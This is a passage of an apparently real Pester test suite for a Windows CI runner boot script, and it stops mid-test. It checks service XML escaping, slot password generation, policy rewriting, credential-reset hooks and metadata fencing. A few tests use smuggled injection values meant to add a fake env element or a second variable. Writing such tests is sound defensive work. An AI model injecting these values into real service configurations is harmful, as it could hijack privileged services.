# Pester tests for the Windows host boot script's PURE functions.
#
# The companion file is windows-beacon.Tests.ps1 and its header applies here
# too: a gate that READS code is not a test, so the decidable half of the boot
# is written as functions with no side effects and this file RUNS them on
# ubuntu-latest.
#
# What this cannot cover is the half that only exists on a Windows host: the
# service control manager, the shim, the metadata server, local accounts. That
# half is proved by the boot probe on the host, where a failure refuses
# registration instead of serving jobs from a broken boundary.

BeforeAll {
    # $PSScriptRoot, not $PSCommandPath -- see the note in
    # windows-beacon.Tests.ps1 for what the difference costs.
    $script:StartupPath = Join-Path $PSScriptRoot '../../modules/ci-runner-host-pool/scripts/windows-host-startup.ps1'
    if (-not (Test-Path -LiteralPath $script:StartupPath)) {
        throw "the boot script is not at $script:StartupPath"
    }
    # Sampled either side of the import, for the reason spelled out in
    # windows-beacon.Tests.ps1: Pester sets $ErrorActionPreference to Stop inside
    # a test block on its own account, so reading the value in an `It` measures
    # Pester and calls it a result. The question is what the FILE changed.
    $script:EapBefore = $ErrorActionPreference
    $script:StrictBefore = try { $null = $script:NeverAssigned; $false } catch { $true }

    . $script:StartupPath

    $script:EapAfter = $ErrorActionPreference
    $script:StrictAfter = try { $null = $script:NeverAssigned; $false } catch { $true }
}

Describe 'dot-sourcing is inert' {
    # Same guard, same reason, as in windows-beacon.Tests.ps1: a script that
    # sets Set-StrictMode or $ErrorActionPreference at script scope reconfigures
    # whoever dot-sources it, and here that is Pester.
    It 'leaves the caller error preference exactly as it found it' {
        $script:EapAfter | Should -Be $script:EapBefore
    }

    It 'does not turn strict mode on in the caller' {
        $script:StrictAfter | Should -Be $script:StrictBefore
    }

    # The entry-point guard is the only thing standing between a dot-source and
    # a full host boot -- Invoke-Main creates directories, reads the metadata
    # server and installs a service.
    #
    # The assertion is that this test EXISTS to be run. A guard that let
    # Invoke-Main go would have called Deny-Boot on the missing
    # ci-github-owner metadata, thrown inside BeforeAll, and failed the whole
    # container before reaching here. So reaching here is the result, and the
    # two checks below confirm the import did the other half of its job.
    It 'defines its functions instead of running them' {
        Get-Command -Name 'Invoke-Main' -CommandType Function | Should -Not -BeNullOrEmpty
        Get-Command -Name 'Invoke-Phase0Preflight' -CommandType Function | Should -Not -BeNullOrEmpty
    }
}

Describe 'golden image assertion' {
    # The Linux script refuses a bare image with `[ -d /opt/actions-runner ]`.
    # A directory check is too weak on Windows: an image can carry a runner and
    # still predate the service shim, the beacon or the boot probe, and each of
    # those absences fails later and less legibly.
    It 'accepts an image at or above the floor' {
        Test-ImageVersion -Marker '3' -Floor 3 | Should -BeTrue
        Test-ImageVersion -Marker '4' -Floor 3 | Should -BeTrue
    }

    It 'refuses an image below the floor' {
        Test-ImageVersion -Marker '2' -Floor 3 | Should -BeFalse
    }

    It 'tolerates the trailing newline every file writer leaves' {
        Test-ImageVersion -Marker "3`r`n" -Floor 3 | Should -BeTrue
        Test-ImageVersion -Marker '  3  ' -Floor 3 | Should -BeTrue
    }

    # An unreadable marker must be a REFUSAL, not a pass. The tempting bug is to
    # treat "no marker" as an old image and carry on; a host that cannot say
    # what it is is not a host this pool knows how to run.
    It 'refuses a marker it cannot read as a number' {
        Test-ImageVersion -Marker '' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker '   ' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker 'v3' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker '3.1' -Floor 1 | Should -BeFalse
        Test-ImageVersion -Marker '-1' -Floor 1 | Should -BeFalse
    }
}

Describe 'beacon service definition' {
    BeforeAll {
        $script:Xml = Get-BeaconServiceConfig -ScriptPath 'C:\ci\bin\ci-beacon.ps1' -IntervalSeconds 45
    }

    # The publisher stopping is the failure that strands a host:
    # `beacon_decision()` reads a stale beacon as keep, forever. A beacon that
    # dies once and stays dead is a machine that bills until somebody notices,
    # which on the Linux side took 2h55m the one time it happened.
    It 'restarts the beacon rather than leaving the host stranded' {
        $script:Xml | Should -Match '<onfailure action="restart"'
    }

    It 'comes back after a restart the host did not choose' {
        $script:Xml | Should -Match '<startmode>Automatic</startmode>'
    }

    # A profile on the image, or a prompt from anything the script calls, hangs
    # the service at start. The SCM reports that as a start failure, which looks
    # nothing like its cause.
    It 'starts powershell with no profile and no prompts' {
        $script:Xml | Should -Match '-NoProfile'
        $script:Xml | Should -Match '-NonInteractive'
    }

    # C:\ci\bin has no space in it today. Someone moving it is exactly the
    # change that would not be re-tested, and an unquoted path there silently
    # truncates the argument list into a service that starts and does nothing.
    It 'quotes the script path against a directory with a space in it' {
        # &quot;, not " -- the argument string is XML-escaped now, exactly as the
        # broker's is, and the shim's parser decodes it back to a quote before
        # anything sees it. Asserting the raw quote here would be asserting that
        # the two service builders differ.
        Get-BeaconServiceConfig -ScriptPath 'C:\ci apps\bin\ci-beacon.ps1' |
        Should -Match '-File &quot;C:\\ci apps\\bin\\ci-beacon\.ps1&quot;'
    }

    # The beacon builder used to interpolate its inputs raw while the broker's
    # escaped them. Both take module constants today, so neither was injectable;
    # the divergence itself is the defect, because the next caller reuses
    # whichever builder it finds first.
    It 'escapes its inputs the same way the broker builder does' {
        $xml = Get-BeaconServiceConfig -ScriptPath 'C:\ci\bin\b.ps1' `
            -ServiceName 'x"/><env name="EVIL" value="1'
        $xml | Should -Not -Match '<env name="EVIL"'
    }

    It 'passes the interval through instead of hardcoding one' {
        $script:Xml | Should -Match '-IntervalSeconds 45'
    }

    # The service id is what phase 0 starts by name. It was ALSO what phase 2
    # exempted from the metadata fence by service SID; section 3A deleted the fence, so
    # this string now has two owners rather than three. Two files still have to
    # agree on it and only this test compares them.
    It 'is named the same thing the starter uses' {
        $script:Xml | Should -Match '<id>ci-beacon</id>'
    }
}

Describe 'slot naming' {
    # The controller parses `<instance>-s<i>` back to an instance in
    # orphan_decision(). A rename on this side does not fail: it silently stops
    # every Windows registration from ever being reaped, and the agents pile up in
    # GitHub's list pointing at hosts that no longer exist.
    It 'matches the name orphan_decision parses back to an instance' {
        Get-SlotUserName -Index 1 | Should -Be 'ci-s1'
        Get-SlotUserName -Index 12 | Should -Be 'ci-s12'
    }

    It 'gives each slot its own workspace' {
        $one = Get-SlotWorkspacePath -Index 1 -Root '/ci/slots'
        $two = Get-SlotWorkspacePath -Index 2 -Root '/ci/slots'
        $one | Should -Not -Be $two
    }

    # The temp directory is UNDER the workspace, not beside it, so the one ACL
    # applied to the workspace covers it. A sibling directory is one more thing to
    # remember to lock, and the one nobody does.
    It 'puts the private temp inside the slot it belongs to' {
        $ws = Get-SlotWorkspacePath -Index 3 -Root '/ci/slots'
        $tmp = Get-SlotTempPath -Index 3 -Root '/ci/slots'
        $tmp.StartsWith($ws) | Should -BeTrue
        $tmp | Should -Not -Be $ws
    }
}

Describe 'slot password' {
    # Complexity is satisfied BY CONSTRUCTION, not by luck. A password Windows
    # rejects is a slot that never registers, discovered on the fleet rather than
    # here -- so this runs the generator enough times that a one-class-missing bug
    # cannot hide behind a lucky draw.
    It 'always carries all four character classes' {
        foreach ($i in 1..50) {
            $chars = -join (Get-SlotPasswordCharacter -Length 20)
            $chars | Should -Match '[A-Z]'
            $chars | Should -Match '[a-z]'
            $chars | Should -Match '[0-9]'
            $chars | Should -Match '[_\-.~]'
        }
    }

    It 'is the length it was asked for' {
        (Get-SlotPasswordCharacter -Length 40).Length | Should -Be 40
        (Get-SlotPasswordCharacter -Length 16).Length | Should -Be 16
    }

    # This value reaches the service control manager. A quote, a backtick, a
    # percent or an ampersand in it is a quoting bug in the one place where the
    # string is a credential; the homoglyphs are out because a password that
    # cannot be read off a console during an incident wastes the incident.
    It 'contains nothing that quotes, expands or reads ambiguously' {
        foreach ($i in 1..50) {
            # I, O, l, o, 0 and 1 are out; lowercase i is not a homoglyph of
            # anything in this alphabet once uppercase I is already gone.
            -join (Get-SlotPasswordCharacter -Length 40) | Should -Match '^[A-HJ-NP-Za-km-np-z2-9_.~-]+$'
        }
    }

    It 'refuses a length that cannot satisfy the classes' {
        { Get-SlotPasswordCharacter -Length 3 } | Should -Throw
    }

    It 'does not hand out the same password twice' {
        $first = -join (Get-SlotPasswordCharacter -Length 40)
        $second = -join (Get-SlotPasswordCharacter -Length 40)
        $first | Should -Not -Be $second
    }

    # Read-only matters: a SecureString still writable after the fact is one a
    # later bug can extend or empty between generating it and registering the
    # service with it.
    It 'hands phase 5 a sealed SecureString, never a string' {
        $secure = Get-SlotPassword -Length 24
        $secure | Should -BeOfType [System.Security.SecureString]
        $secure.Length | Should -Be 24
        $secure.IsReadOnly() | Should -BeTrue
    }
}

Describe 'phase 1 ordering' {
    # THIS IS THE SECURITY TEST OF PHASE 1, AND IT IS ABOUT ORDER, NOT CONTENT.
    #
    # C:\ci\bin holds ci-beacon.ps1, which the SCM re-executes as LocalSystem on
    # every service restart and every reboot. Phase 0 created that directory with
    # whatever ACL C:\ hands down, which is harmless only while the host has no
    # unprivileged principal on it. Create the slot accounts first and there is a
    # window -- one that survives the reboot -- in which a slot can write the file
    # that comes back as SYSTEM.
    #
    # Nothing about that ordering is visible in the code's shape, and a later
    # refactor that groups "all the account work" together would reverse it
    # without looking wrong. So the order is recorded and asserted.
    BeforeEach {
        $script:Calls = @()
        Mock -CommandName Protect-CiDirectory -MockWith { $script:Calls += "protect:$Path" }
        Mock -CommandName Initialize-SlotAccount -MockWith {
            $script:Calls += "account:$Index"
            @{ Index = $Index; User = "ci-s$Index" }
        }
        Mock -CommandName Grant-SlotLogonRight -MockWith { $script:Calls += 'rights' }
        Mock -CommandName Write-BootLog -MockWith { }
    }

    It 'locks the beacon directory before any slot account exists' {
        Invoke-Phase1SlotSetup -Slots 2 | Out-Null
        $firstAccount = [array]::FindIndex([string[]] $script:Calls, [Predicate[string]] { $args[0] -like 'account:*' })
        $lastProtect = [array]::FindLastIndex([string[]] $script:Calls, [Predicate[string]] { $args[0] -eq 'protect:C:\ci\bin' })
        $lastProtect | Should -BeGreaterOrEqual 0
        $firstAccount | Should -BeGreaterThan $lastProtect
    }

    It 'locks the root and the slot root too, not only the bin' {
        Invoke-Phase1SlotSetup -Slots 1 | Out-Null
        $script:Calls | Should -Contain 'protect:C:\ci'
        $script:Calls | Should -Contain 'protect:C:\ci\slots'
    }

    # One policy write, after every account exists. Per-slot imports mean N full
    # policy writes, any one of which is the one that gets interrupted -- leaving
    # a host with the grant applied and the denies not, which is the state this
    # whole section exists to prevent.
    It 'applies logon rights once, after every account is made' {
        Invoke-Phase1SlotSetup -Slots 3 | Out-Null
        @($script:Calls | Where-Object { $_ -eq 'rights' }).Count | Should -Be 1
        $script:Calls[-1] | Should -Be 'rights'
    }

    It 'provisions exactly the number of slots it was given' {
        Invoke-Phase1SlotSetup -Slots 3 | Out-Null
        @($script:Calls | Where-Object { $_ -like 'account:*' }).Count | Should -Be 3
    }
}

Describe 'security policy rewriting' {
    # The \r? in every anchored pattern below is load-bearing, not noise. The INF
    # this code writes is CRLF on purpose (secedit reads nothing else), and .NET's
    # multiline $ anchors before the \n with the \r still ahead of it, so a bare $
    # never matches a line of the very file format under test.
    # A fresh image has no SeDenyNetworkLogonRight line at all. Skipping an absent
    # privilege is how a deny the code claims to apply ends up not applied, and
    # nothing downstream would report it: secedit imports the file happily and the
    # slots keep the right they were supposed to lose.
    It 'adds a privilege the exported policy never had' {
        $inf = "[Unicode]`r`nUnicode=yes`r`n[Privilege Rights]`r`nSeServiceLogonRight = *S-1-5-80-0`r`n"
        $out = Edit-InfPrivilege -InfText $inf -Privilege 'SeDenyNetworkLogonRight' -Accounts @('*S-1-5-21-1-1-1-1001')
        $out | Should -Match '(?m)^SeDenyNetworkLogonRight = \*S-1-5-21-1-1-1-1001\r?$'
        $out | Should -Match '(?m)^SeServiceLogonRight = \*S-1-5-80-0\r?$'
    }

    # REPLACED, not appended to. Appending leaves the previous membership in
    # place, which for a deny right reads as working and for SeServiceLogonRight
    # quietly widens who may log on as a service.
    It 'replaces an existing line instead of appending to it' {
        $inf = "[Privilege Rights]`r`nSeDenyNetworkLogonRight = *S-1-5-32-546`r`n"
        $out = Edit-InfPrivilege -InfText $inf -Privilege 'SeDenyNetworkLogonRight' -Accounts @('*S-1-5-21-9')
        $out | Should -Match '(?m)^SeDenyNetworkLogonRight = \*S-1-5-21-9\r?$'
        $out | Should -Not -Match 'S-1-5-32-546'
        ([regex]::Matches($out, 'SeDenyNetworkLogonRight')).Count | Should -Be 1
    }

    It 'creates the section when the export has none' {
        $out = Edit-InfPrivilege -InfText "[Unicode]`r`nUnicode=yes" -Privilege 'SeServiceLogonRight' -Accounts @('*S-1-5-21-7')
        $out | Should -Match '(?m)^\[Privilege Rights\]\r?$'
        $out | Should -Match '(?m)^SeServiceLogonRight = \*S-1-5-21-7\r?$'
    }

    It 'writes every account on the one line secedit reads' {
        $out = Edit-InfPrivilege -InfText '[Privilege Rights]' -Privilege 'SeServiceLogonRight' `
            -Accounts @('*S-1-5-21-1', '*S-1-5-21-2', '*S-1-5-21-3')
        $out | Should -Match '(?m)^SeServiceLogonRight = \*S-1-5-21-1,\*S-1-5-21-2,\*S-1-5-21-3\r?$'
    }

    # An INF is a Windows file and secedit is a Windows tool: a rewrite that
    # emitted bare LF would be read back by an OS that expects CRLF, and the
    # failure mode is a policy import that reports success having applied part of
    # the file.
    It 'keeps the line endings secedit expects' {
        $out = Edit-InfPrivilege -InfText "[Privilege Rights]`r`nSeServiceLogonRight = *S-1-5-80-0`r`n" `
            -Privilege 'SeDenyInteractiveLogonRight' -Accounts @('*S-1-5-21-4')
        $out | Should -Match "`r`n"
        ($out -split "`r`n" | Where-Object { $_ -match '^\[Privilege Rights\]$' }).Count | Should -Be 1
    }

    # Nothing outside the one line changes. secedit's INF carries sections this
    # script has no business editing, and a rewrite that dropped [Unicode] gives
    # an import failure whose message is about encoding.
    It 'leaves every other line of the policy alone' {
        $inf = "[Unicode]`r`nUnicode=yes`r`n[Version]`r`nsignature=`"`$CHICAGO`$`"`r`n[Privilege Rights]`r`nSeBatchLogonRight = *S-1-5-32-544`r`n"
        $out = Edit-InfPrivilege -InfText $inf -Privilege 'SeServiceLogonRight' -Accounts @('*S-1-5-21-5')
        $out | Should -Match '(?m)^Unicode=yes\r?$'
        $out | Should -Match '(?m)^signature='
        $out | Should -Match '(?m)^SeBatchLogonRight = \*S-1-5-32-544\r?$'
    }
}

# --- phase 3, the job credential broker ---------------------------------------

Describe 'job service account validation' {
    # Instance metadata is a trust boundary on a Windows pool -- section 3A accepts that
    # job code can read it and does not assume nothing can write it. The value
    # lands in service XML and in a LocalSystem service's environment block, so
    # the check is a whitelist of the shape, not a blacklist of characters.
    It 'accepts a service-account address' {
        Test-JobServiceAccountName -Name 'ci-job@example-project.iam.gserviceaccount.com' | Should -BeTrue
    }

    It 'rejects nothing at all' {
        Test-JobServiceAccountName -Name '' | Should -BeFalse
        Test-JobServiceAccountName -Name '   ' | Should -BeFalse
        Test-JobServiceAccountName -Name $null | Should -BeFalse
    }

    # The two shapes that would turn a value into markup or into a second
    # variable. Escaping handles the first anyway; this is the half that stops a
    # WELL-FORMED document from saying something other than what phase 3 meant.
    It 'rejects a value that could close an element or open a line' {
        Test-JobServiceAccountName -Name 'a@b.com"/><env name="X" value="y' | Should -BeFalse
        Test-JobServiceAccountName -Name "a@b.com`nCI_BROKER_PORT=1" | Should -BeFalse
    }

    It 'rejects something that is not an address' {
        Test-JobServiceAccountName -Name 'ci-job' | Should -BeFalse
        Test-JobServiceAccountName -Name 'ci-job@localhost' | Should -BeFalse
    }
}

Describe 'broker port parsing' {
    It 'takes a port metadata actually set' {
        Get-BrokerPort -Value '9099' | Should -Be 9099
    }

    # Falling back is right for the port and would be WRONG for the account: a
    # default port serves the same broker, a default identity is somebody else's.
    It 'falls back when metadata says nothing' {
        Get-BrokerPort -Value '' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value $null | Should -Be $script:DefaultBrokerPort
    }

    It 'falls back on anything that is not a whole number' {
        Get-BrokerPort -Value '80 80' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '-1' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '8.0' | Should -Be $script:DefaultBrokerPort
    }

    It 'falls back outside the range a socket would accept' {
        Get-BrokerPort -Value '0' | Should -Be $script:DefaultBrokerPort
        Get-BrokerPort -Value '65536' | Should -Be $script:DefaultBrokerPort
    }

    # This case was a real defect, found by running the function rather than by
    # reading it. All-digits is not the same thing as a number that fits, and
    # `[int64] '99999999999999999999'` THROWS -- which under the entry point's
    # $ErrorActionPreference = 'Stop' is a dead host with a cast error in its log
    # instead of a live one on the default port.
    It 'falls back on a number too large to be one, instead of throwing' {
        { Get-BrokerPort -Value '99999999999999999999' } | Should -Not -Throw
        Get-BrokerPort -Value '99999999999999999999' | Should -Be $script:DefaultBrokerPort
    }
}

Describe 'broker service definition' {
    BeforeAll {
        $script:BrokerXml = Get-BrokerServiceConfig -ScriptPath 'C:\ci\bin\job-metadata-broker.py' `
            -JobServiceAccount 'ci-job@example-project.iam.gserviceaccount.com' -Port 8081
    }

    # Loopback, not 0.0.0.0 as on Linux. Windows gives the slots no network
    # namespace of their own, so binding the VM's address would widen who can
    # reach a credential vendor without narrowing anything for the slots.
    It 'binds loopback and never the host address' {
        $script:BrokerXml | Should -Match '<env name="CI_BROKER_HOST" value="127\.0\.0\.1"/>'
        $script:BrokerXml | Should -Not -Match '0\.0\.0\.0'
    }

    It 'vends the identity it was given, on the port it was given' {
        $script:BrokerXml | Should -Match 'CI_JOB_SERVICE_ACCOUNT" value="ci-job@example-project\.iam\.gserviceaccount\.com"'
        $script:BrokerXml | Should -Match 'CI_BROKER_PORT" value="8081"'
    }

    # Escaping is the half that survives a value the caller's validation did not
    # see -- a future caller, a future metadata key. The angle bracket must come
    # out as text, so the document still has exactly the elements phase 3 wrote.
    It 'escapes a hostile value into text rather than markup' {
        $xml = Get-BrokerServiceConfig -ScriptPath 'C:\ci\bin\b.py' `
            -JobServiceAccount 'x"/><env name="EVIL" value="1' -Port 8081
        $xml | Should -Not -Match '<env name="EVIL"'
        $xml | Should -Match '&quot;|&lt;'
    }

    # A broker that dies stops every job on the host from authenticating. The
    # service manager restarting it is the only thing watching.
    It 'restarts itself rather than staying dead' {
        $script:BrokerXml | Should -Match '<onfailure action="restart"'
        $script:BrokerXml | Should -Match '<startmode>Automatic</startmode>'
    }
}

# --- phase 4, the per-job credential reset hooks -------------------------------

Describe 'credential reset hook body' {
    BeforeAll { $script:Hook = Get-JobHookScript }

    # The hook runs inside the agent's environment. %USERPROFILE% and %APPDATA%
    # are values a job could have changed, so what gets deleted would be the
    # job's decision rather than the host's. The account database is not.
    It 'resolves the profile from the account database, not the environment' {
        $script:Hook | Should -Match 'ProfileList'
        $script:Hook | Should -Match 'ProfileImagePath'
        $code = ($script:Hook -split "`n" | Where-Object { $_ -notmatch '^\s*#' }) -join "`n"
        $code | Should -Not -Match '\$env:USERPROFILE'
        $code | Should -Not -Match '\$env:APPDATA'
    }

    # A resolution that somehow yields C:\Users\Administrator must abort, not
    # recurse. This is the difference between a cleanup and an incident.
    It 'refuses a profile that is not a slot profile' {
        $script:Hook | Should -Match "notmatch '\^ci-s\[0-9\]\+\`$'"
        $script:Hook | Should -Match 'exit 1'
    }

    It 'removes the credential state a previous job could have left' {
        $script:Hook | Should -Match 'AppData\\Roaming\\gcloud'
        $script:Hook | Should -Match 'AppData\\Roaming\\gsutil'
        $script:Hook | Should -Match 'Remove-Item -LiteralPath \$target -Recurse -Force'
    }

    # A hook whose meaning a job's own preference variables could change is not a
    # control. It sets its own.
    It 'sets its own error handling rather than inheriting the agent''s' {
        $script:Hook | Should -Match 'Set-StrictMode -Version Latest'
        $script:Hook | Should -Match "\`$ErrorActionPreference = 'Stop'"
    }
}

Describe 'slot service environment' {
    # THE ASSERTION THIS WHOLE DESCRIBE EXISTS FOR. A pool with no job service
    # account starts no broker, and it is the pool where an inherited or ambient
    # credential is MOST dangerous: nothing on the host is competing with whatever
    # the last workflow left behind, so the leftover is simply what the next job
    # authenticates as. The hooks clear the leftover; the GCE_METADATA_* values
    # close the other door. All five are set here, and the second half is why:
    # unset, GCE_METADATA_* does not withhold credentials, it hands ADC back to
    # 169.254.169.254 and the HOST service account, because section 3A deleted the
    # fence that gives Linux that property for free.
    It 'sets both hooks when there is no broker at all' {
        $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '' -SlotRoot '/ci/slots'
        $block['ACTIONS_RUNNER_HOOK_JOB_STARTED'] | Should -Be $script:JobHookPath
        $block['ACTIONS_RUNNER_HOOK_JOB_COMPLETED'] | Should -Be $script:JobHookPath
        $block['GCE_METADATA_HOST'] | Should -Be $script:ClosedMetadataEndpoint
        $block['GCE_METADATA_IP'] | Should -Be $script:ClosedMetadataEndpoint
        $block['GCE_METADATA_ROOT'] | Should -Be $script:ClosedMetadataEndpoint
    }

    It 'sets both hooks when there is one' {
        $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '127.0.0.1:8081' -SlotRoot '/ci/slots'
        $block['ACTIONS_RUNNER_HOOK_JOB_STARTED'] | Should -Be $script:JobHookPath
        $block['ACTIONS_RUNNER_HOOK_JOB_COMPLETED'] | Should -Be $script:JobHookPath
    }

    # All three, or the client libraries disagree about where the metadata server
    # is and one of them reaches the real one -- which answers with the HOST's
    # identity, the exact downgrade the broker exists to prevent.
    It 'points every metadata client at the broker when there is one' {
        $block = Get-SlotServiceEnvironment -Index 2 -BrokerEndpoint '127.0.0.1:8081' -SlotRoot '/ci/slots'
        $block['GCE_METADATA_HOST'] | Should -Be '127.0.0.1:8081'
        $block['GCE_METADATA_IP'] | Should -Be '127.0.0.1:8081'
        $block['GCE_METADATA_ROOT'] | Should -Be '127.0.0.1:8081'
    }

    # Per service, never machine-wide: a machine-wide TMP hands every slot the
    # same one, which is the collision the per-slot directory removes.
    It 'gives each slot its own temp' {
        $one = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots'
        $two = Get-SlotServiceEnvironment -Index 2 -SlotRoot '/ci/slots'
        $one['TMP'] | Should -Be $one['TEMP']
        $one['TMP'] | Should -Not -Be $two['TMP']
    }
}

# The job hook is a FILE locked by the same function that locks the directories,
# and .NET does not let a file ACE carry inheritance flags -- AddAccessRule throws
# "No flags can be set" rather than ignoring them. Under the entry point's
# 'Stop' preference that throw is a host that never finishes booting, so the
# distinction is asserted here rather than discovered there.
Describe 'acl inheritance flags' {
    It 'makes a directory ACE inheritable' {
        $flags = Get-AclInheritanceFlag -IsContainer $true
        $flags.HasFlag([System.Security.AccessControl.InheritanceFlags]::ContainerInherit) | Should -BeTrue
        $flags.HasFlag([System.Security.AccessControl.InheritanceFlags]::ObjectInherit) | Should -BeTrue
    }

    It 'gives a file ACE no flags at all, because .NET rejects any' {
        Get-AclInheritanceFlag -IsContainer $false |
            Should -Be ([System.Security.AccessControl.InheritanceFlags]::None)
    }
}

# THE DISTINCTION THIS SUITE EXISTS FOR MOST
#
# Get-MetadataValue used to swallow every exception into '', which made a flaky
# read indistinguishable from an unset attribute. Two attributes make that
# fatal: an unread ci-job-service-account turns a broker pool into a no-broker
# pool, and an unread ci-image-min-version drops the image floor to 1 and lets a
# host boot from an image with no shim. Neither failure says anything in the log
# that a healthy boot does not also say.
Describe 'metadata read failures' {
    It 'treats a 404 as an attribute that is genuinely not set' {
        Test-MetadataAbsence -StatusCode 404 | Should -BeTrue
    }

    # The case the old handler got wrong, and the one that actually happens: a
    # refused connection, a DNS failure or a read timeout never produces an HTTP
    # status at all.
    It 'refuses to read a transport failure as an unset attribute' {
        Test-MetadataAbsence -StatusCode $null | Should -BeFalse
    }

    It 'refuses to read a server error as an unset attribute' {
        Test-MetadataAbsence -StatusCode 500 | Should -BeFalse
        Test-MetadataAbsence -StatusCode 503 | Should -BeFalse
        Test-MetadataAbsence -StatusCode 403 | Should -BeFalse
    }

    It 'reads the status the same whether it arrives as an enum or a number' {
        Test-MetadataAbsence -StatusCode ([System.Net.HttpStatusCode]::NotFound) | Should -BeTrue
        Test-MetadataAbsence -StatusCode ([System.Net.HttpStatusCode]::InternalServerError) |
            Should -BeFalse
    }
}

# A vended token proves a broker is THERE, not that it is OURS. Every slot on a
# Windows host shares one loopback, nothing reserves the broker's port, and the
# shim's restart delay leaves it free for ten seconds after any crash -- long
# enough for a process a previous job left behind to take it and answer with a
# metadata document of its own choosing.
Describe 'broker listener ownership' {
    It 'accepts the one SID a slot account can never hold' {
        Test-BrokerListenerSid -Sid 'S-1-5-18' | Should -BeTrue
    }

    It 'rejects a local account, which is what a squatter would be' {
        Test-BrokerListenerSid -Sid 'S-1-5-21-1-2-3-1001' | Should -BeFalse
    }

    # Get-PortListenerSid returns '' for no listener, a process that exited
    # between the two lookups, and a CIM call that did not answer. All three mean
    # "not ours", and this is where that reading is made explicit.
    It 'reads an unknown owner as not ours rather than as ours' {
        Test-BrokerListenerSid -Sid '' | Should -BeFalse
        Test-BrokerListenerSid -Sid '   ' | Should -BeFalse
        Test-BrokerListenerSid -Sid $null | Should -BeFalse
    }

    It 'ignores the whitespace a CIM property arrives with' {
        Test-BrokerListenerSid -Sid " S-1-5-18`n" | Should -BeTrue
    }
}

# The reservation is the only thing that makes 127.0.0.1:1 a CLOSED endpoint
# rather than a free one. A netsh call that names the wrong protocol or a range
# of the wrong length protects nothing, and there is no way to notice that on a
# host afterwards: the port is simply available the day somebody wants it.
Describe 'closed metadata endpoint' {
    It 'reserves exactly one TCP port, at the port it was given' {
        $args1 = Get-PortReservationArgument -Port 1
        $args1 | Should -Contain 'protocol=tcp'
        $args1 | Should -Contain 'startport=1'
        $args1 | Should -Contain 'numberofports=1'
        $args1 | Should -Contain 'excludedportrange'
    }

    It 'passes the port through instead of hardcoding one' {
        Get-PortReservationArgument -Port 9999 | Should -Contain 'startport=9999'
    }

    # The constant and the port must name the same socket. They are read in two
    # different phases -- the port by phase 3's reservation, the endpoint by the
    # slot environment block -- so nothing but this compares them.
    It 'reserves the port the slots are actually pointed at' {
        $script:ClosedMetadataEndpoint | Should -Be "127.0.0.1:$script:ClosedMetadataPort"
    }

    # Not the broker's default, and not the real metadata server. Either would
    # turn the fail-closed endpoint back into a working one.
    It 'is not a port anything on this host answers on' {
        $script:ClosedMetadataPort | Should -Not -Be $script:DefaultBrokerPort
        $script:ClosedMetadataEndpoint | Should -Not -Match '169\.254\.169\.254'
    }
}

# --- phase 5 -----------------------------------------------------------------

Describe 'runner config arguments' {
    # The recycle contract and the 90-minute stall this pool replaces both live in
    # this argument list, and every one of them is a silent loss: a runner that
    # self-updates is alive, offline and undispatchable, and on a warm host that
    # is K slots at once rather than one short-lived VM.
    It 'pins the agent version by refusing the self-update' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a | Should -Contain '--disableupdate'
    }

    # A rebooted host has an agent of this name already in GitHub's list, and a
    # refused registration is a slot that never comes back.
    It 'replaces the registration a reboot left behind' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a | Should -Contain '--replace'
        $a | Should -Contain '--unattended'
        $a | Should -Contain '--runasservice'
    }

    # No account flags, ever. config.cmd takes a logon password as a plaintext
    # argument, in the process table of a host whose local accounts run
    # pull-request code; the logon account is set afterwards through
    # ChangeServiceConfigW instead.
    It 'passes no logon account and no password' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        ($a -join ' ') | Should -Not -Match 'logon'
        ($a -join ' ') | Should -Not -Match 'password'
    }

    It 'builds the repository url from the owner and repo' {
        $a = Get-RunnerConfigArgument -Owner 'acme' -Repo 'infra' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a[[array]::IndexOf($a, '--url') + 1] | Should -Be 'https://github.com/acme/infra'
    }

    # An empty label string must not become a `--labels ''` pair: PowerShell 5.1
    # drops an empty native-command argument, so config.cmd would see `--labels`
    # followed by whatever came next and register with the wrong flag value.
    It 'omits labels entirely when there are none' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels '' -WorkPath '/w'
        $a | Should -Not -Contain '--labels'
    }

    It 'omits the runner group when there is none' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a | Should -Not -Contain '--runnergroup'
    }

    It 'passes the runner group when there is one' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' `
            -WorkPath '/w' -RunnerGroup 'warm'
        $a[[array]::IndexOf($a, '--runnergroup') + 1] | Should -Be 'warm'
    }
}

Describe 'slot agent name' {
    # orphan_decision() on the controller parses this name back to an instance, so
    # a rename here silently un-reaps every Windows registration: the agent stays
    # in GitHub's list, the host it names is gone, and nothing notices.
    It 'is the instance name and the slot index' {
        Get-SlotAgentName -InstanceName 'ci-w-abcd' -Index 2 | Should -Be 'ci-w-abcd-s2'
    }

    It 'gives two slots on one host two different names' {
        (Get-SlotAgentName -InstanceName 'h' -Index 1) |
            Should -Not -Be (Get-SlotAgentName -InstanceName 'h' -Index 2)
    }
}

Describe 'runner service name' {
    # The marker file lives in a directory the slot account can write, and the
    # name reaches sc.exe. Anything not vouched for comes back '' and the caller
    # denies the boot -- refused, never escaped.
    It 'accepts the name config.cmd records' {
        Get-RunnerServiceName -Marker 'actions.runner.acme-infra.h-s1' -AgentName 'h-s1' |
            Should -Be 'actions.runner.acme-infra.h-s1'
    }

    It 'trims the trailing newline the marker file carries' {
        Get-RunnerServiceName -Marker "actions.runner.a.b`r`n" -AgentName 'b' |
